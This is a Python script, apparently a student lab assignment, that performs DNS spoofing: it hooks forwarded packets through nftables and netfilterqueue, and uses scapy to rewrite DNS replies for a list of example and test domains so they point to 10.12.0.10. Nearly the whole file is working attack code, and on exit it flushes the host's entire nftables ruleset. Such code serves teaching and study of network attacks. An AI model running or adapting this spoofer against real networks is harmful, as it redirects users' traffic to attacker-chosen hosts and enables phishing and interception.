"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

DNS cache poisoning
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


# Constants
dns_hosts = {
    b"example.com.": "10.12.0.10",
    b"www.example.com.": "10.12.0.10",
    b"example.org" : "10.12.0.10",
    b"example.be" : "10.12.0.10",
    b"example.fr" : "10.12.0.10",
    b"test.com" : "10.12.0.10",
    b"a-very-long-domain-name.com" : "10.12.0.10",
    b"a-very-long-domain-name.org" : "10.12.0.10",
    b"oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof" : "10.12.0.10",
    b"i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof" : "10.12.0.10",
    b"domain.oof" : "10.12.0.10",
}

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a example.com answer, this function replaces 
    the real IP address with fake IP address (10.12.0.10)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))

    packet.accept()


def add_rules(): 
    # Add a ruleset for the netfilterqueue using nftables
    print("[+] Adding ruleset for netfilterqueue...")
    os.system(f"nft add table inet filter")
    os.system(f"nft add chain inet filter forward {{ type filter hook forward priority 0 \; }}")
    os.system(f"nft add rule inet filter forward queue num {QUEUE_NUM}")



def main(): 
    # Adding nft rules
    add_rules() 

    # Instantiate the netfilter queue
    queue = NetfilterQueue()

    try:
        # Bind the queue number to our callback `process_packet` and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # If you want to exit, make sure you remove the ruleset you just inserted, going back to normal.
        print("[+] Flushing rulesets...")
        os.system("nft flush ruleset")

if __name__ == "__main__":
    QUEUE_NUM = 0
    main()